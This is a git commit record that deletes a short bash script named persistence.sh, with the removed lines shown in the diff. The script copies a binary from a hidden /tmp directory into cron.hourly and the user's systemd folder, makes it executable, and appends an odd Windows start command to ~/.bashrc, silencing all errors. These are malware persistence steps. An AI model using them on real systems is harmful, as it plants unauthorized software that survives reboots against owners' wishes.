658b7ecb7c554374a55a81378c7a1e74762e47ce
julibuli1324-prog <julibuli1324@gmail.com>
2026-05-01 17:08:45 -0700

    Delete persistence.sh

--- persistence.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash
-cp /tmp/.system_update/agent.bin ~/.config/systemd/ 2>/dev/null
-cp /tmp/.system_update/agent.bin /etc/cron.hourly/ 2>/dev/null
-chmod +x /etc/cron.hourly/agent.bin 2>/dev/null
-echo 'start /B C:\\Users\\Public\\agent.exe' >> ~/.bashrc 2>/dev/null
